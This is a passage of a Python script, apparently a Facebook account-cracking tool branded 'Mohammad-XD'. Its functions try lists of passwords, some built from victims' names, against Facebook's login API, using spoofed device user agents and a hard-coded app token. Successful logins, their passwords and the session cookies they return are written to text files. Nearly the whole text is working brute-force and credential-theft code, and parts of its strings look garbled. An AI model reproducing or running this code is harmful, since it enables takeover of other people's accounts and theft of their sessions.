	os.system('python Mohammad.py')

def rd1(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m [Mohammad-XD]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				accees_token = '0731859719|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				accees_token = '0731859719|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				fbrv = str(random.randint(000000000,999999999))
				fbsv = str(random.randint(4,13))+'.0'
				model,build = random.choice(samsung).split('|')
				fbmf = 'samsung'
				fbbd = 'samsung'
				en = random.choice(['en_US','en_GB'])
				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
				xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/Hwawie;"+"FBBD/Opppo;"+"FBPN/com.facebook.katana;"+"FBDV/Samsong 17974;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:arfuck-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/relmeo;"+"FBBD/technO;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 0731859719|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
				po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
				if 'session_key' in po:
						uid = str(po['uid'])
						ckkk = ";".join(i["name"]+"="+i["Mohammad"] for i in po["session_cookies"])
						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
						cookie = f"sb={ssbb};{ckkk}"
						print('\r\r\033[1;32m [Mohammad-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Mohammad_R_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Mohammad_R_COOKIEs.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
							file_ok.write(uid+'|'+pas+'\n')
							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						#print(f'\r\r\33[1m\33[1;35m [Mohammad-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Mohammad-CP.txt')
						with open(file_path, 'a') as file:
							file.write(uid+'|'+pas+'\n')
						cps.append(uid)
						break
				else:
					continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[Mohammad-XD]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '0731859719|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			en = random.choice(['en_US','en_GB'])
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 0731859719|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [Mohammda-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'Mohammad_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					#print(f'\r\r\33[1m\33[1;35m [Mohammad-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'Mohammad-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

Main_Mohammad()
